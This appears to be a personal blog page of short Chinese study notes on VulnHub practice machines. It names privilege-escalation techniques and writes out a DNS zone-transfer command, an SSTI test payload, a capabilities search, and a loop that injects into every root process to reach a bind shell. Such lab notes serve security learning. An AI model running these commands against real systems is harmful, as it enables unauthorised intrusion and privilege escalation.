<h1 id="BEELZEBUB-1"><a href="#BEELZEBUB-1" class="headerlink" title="BEELZEBUB: 1"></a>BEELZEBUB: 1</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/upfine/p/16888142.html">upfine的博客 (cnblogs.com)</a></p>
<p>感觉主要是枚举，但有一些扫到的可能有用的目录啥的确实没用上，这里有一个专门针对wp的wpscan，使用-e可以进行枚举，-force忽略检测网站是否是wordpress</p>
<p>这里提权又遇到policykit，发现在exdb上查询相关名称可以检索到</p>
<h1 id="hackable-III"><a href="#hackable-III" class="headerlink" title="hackable III"></a>hackable III</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39368364/article/details/119917637">VulnHub靶机_HACKABLE: III_Yiru Zhao的博客-CSDN博客</a></p>
<p>图片隐写、端口碰撞、lxd提权</p>
<p>这里端口碰撞但是没办法启动端口。。。</p>
<h1 id="hackkid"><a href="#hackkid" class="headerlink" title="hackkid *"></a>hackkid *</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/324396.html">vulnhub-Hacker_Kid靶机渗透过程 - FreeBuf网络安全行业门户</a></p>
<p>这个靶机遇到了几个不熟悉的漏洞，比如SSTI注入、DNS区域传输漏洞、Capabilities提权等</p>
<p>关于DNS区域传输：</p>
<p>dig  axfr @192.168.26.139  blackhat.local</p>
<p>这里另一个博主没有使用axfr也能挖到，但是得到的内容比较少</p>
<p>然后关于SSTI注入：</p>
<p>该注入也能进行XSS，：这里给出了一个模板注入通用的测试payload：NaN${1+abcdef}<?1+abcdef?>[1+abcdef]</p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2130787">一文了解SSTI和所有常见payload 以flask模板为例-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<blockquote>
<p>发现<code>&#123;&#123; --- &#125;&#125;</code>其中的语句被执行了</p>
<ul>
<li>这是因为在flask中，渲染引擎Jinja2会将<code>&#123;&#123; --- &#125;&#125;</code>视为变量标识符，会将其包含的内容作为变量处理，从而包裹的语句被执行</li>
<li>那么，在上一段代码中，如果我们传入的参数内容为<code>&#123;&#123; --- &#125;&#125;</code>包裹的代码，这些代码就会被执行</li>
</ul>
</blockquote>
<p>cap部分：这条命令可以用于发现具有Capabilities特殊操作权限的程序。</p>
<pre><code>getcap -r / 2&gt;/dev/null      # -r 递归查询
</code></pre>
<p>因为需要找root进程进行注入，所以简单写个shell脚本对root进程进行批量尝试。</p>
<pre><code>for i in `ps -ef|grep root|grep -v &quot;grep&quot;|awk &#39;&#123;print $2&#125;&#39;`; do python2.7 inject.py $i; done
</code></pre>
<p>通过ss -pantu 找到tcp监听的bind shell，kali使用nc连接</p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2023/08/15/XSS/" title="XSS"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: XSS</span></a><a class="button is-default" href="/2023/08/10/SERVICES/" title="attacking SERVICES"><span class="has-text-weight-semibold">Next: attacking SERVICES</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="https://github.com/Taninluv/Taninluv.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/Taninluv"><i class="iconfont icon-github"></i></a><!-- Ins--><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--></section><p><span>Copyright ©</span><span> Taninluv 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>